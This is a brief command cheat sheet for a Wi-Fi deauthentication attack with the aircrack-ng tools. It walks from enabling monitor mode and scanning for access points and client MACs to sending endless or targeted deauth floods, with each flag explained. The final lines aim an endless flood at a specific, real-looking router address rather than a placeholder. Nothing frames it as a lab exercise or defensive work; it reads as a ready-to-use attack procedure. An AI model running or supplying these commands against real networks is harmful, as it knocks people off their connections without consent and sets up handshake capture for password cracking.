# 1. Check wireless interfaces
iwconfig

# 2. Kill interfering processes (very important)
sudo airmon-ng check kill

# 3. Start monitor mode on your Wi-Fi card (e.g. wlan0 → becomes wlan0mon)
sudo airmon-ng start wlan0

# 4. Scan for networks & clients (find BSSID, channel, client MACs)
sudo airodump-ng wlan0mon
#   -or targeted-
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon

# 5. Deauthentication (the actual attack part — this is what you see in videos)
# Basic: deauth everyone from one AP (broadcast style)
sudo aireplay-ng --deauth 0 -a AA:BB:CC:DD:EE:FF wlan0mon

# Targeted: deauth one specific client
sudo aireplay-ng --deauth 64 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon

# Common flags explained:
# --deauth / -0     = deauth attack mode
# 0 / 64 / 10       = number of deauth packets (0 = endless / flood)
# -a                = BSSID of the Access Point (router MAC)
# -c                = client MAC to kick (omit for all clients)
# wlan0mon          = your monitor-mode interface

sudo aireplay-ng --deauth 0 -a 5C:62:8B:F5:9F:20 -D wlan0mon
sudo iw dev wlan0mon set channel 11
sudo airodump-ng --channel 1 --bssid 5C:62:8B:F5:9F:20 wlan0mon